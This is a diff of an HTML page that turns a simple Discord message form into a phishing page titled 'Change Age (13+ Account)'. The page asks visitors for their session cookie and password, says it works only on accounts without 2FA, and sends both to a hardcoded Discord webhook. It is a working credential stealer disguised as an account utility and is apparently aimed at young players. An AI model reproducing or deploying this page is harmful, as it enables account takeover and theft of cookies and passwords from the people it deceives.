@@ -1,34 +1,83 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Send to Discord</title>
+  <meta charset="UTF-8">
+  <title>Change Age</title>
+  <style>
+    body {
+      background-color: #1e1e2f;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      text-align: center;
+      padding-top: 40px;
+    }
+    .container {
+      background: #2f3542;
+      padding: 20px;
+      border-radius: 15px;
+      display: inline-block;
+      min-width: 300px;
+    }
+    input {
+      display: block;
+      margin: 10px auto;
+      padding: 10px;
+      width: 80%;
+      border-radius: 5px;
+      border: none;
+      background: #1e272e;
+      color: white;
+    }
+    button {
+      background: #ffa502;
+      color: white;
+      border: none;
+      padding: 10px 30px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+  </style>
 </head>
 <body>
-  <h2>Send Message to Discord</h2>
-  <input type="text" id="message" placeholder="Type your message..." />
-  <button onclick="sendToDiscord()">Send</button>
+  <div class="container">
+    <h2>Change Age (13+ Account)</h2>
+    <p><strong>Note:</strong> Only works on accounts without 2FA.</p>
+    <input type="text" id="cookie" placeholder="Cookie">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="sendToDiscord()">Change</button>
+  </div>
 
   <script>
     async function sendToDiscord() {
-      const webhookURL = "YOUR_WEBHOOK_URL_HERE"; // replace with your Discord webhook
-      const message = document.getElementById("message").value;
+      const cookie = document.getElementById("cookie").value;
+      const password = document.getElementById("password").value;
+      const webhook = "https://discord.com/api/webhooks/1359540991710859566/x0Q8WbwtQR2WzgEacXd1DXFoLFJiYGRMGSMFPYw_pW6r_gvSv5UixBi9aTKG3crqPtFT"; // Replace this
 
-      if (!message) {
-        alert("Please enter a message.");
+      if (!cookie || !password) {
+        alert("Please enter both cookie and password.");
         return;
       }
 
       const payload = {
-        content: message
+        content: `New Entry:\n**Cookie:** ${cookie}\n**Password:** ${password}`
       };
 
-      await fetch(webhookURL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
+      try {
+        await fetch(webhook, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
 
-      alert("Message sent!");
+        alert("Sent successfully.");
+      } catch (e) {
+        alert("Failed to send.");
+        console.error(e);
+      }
     }
   </script>
 </body>
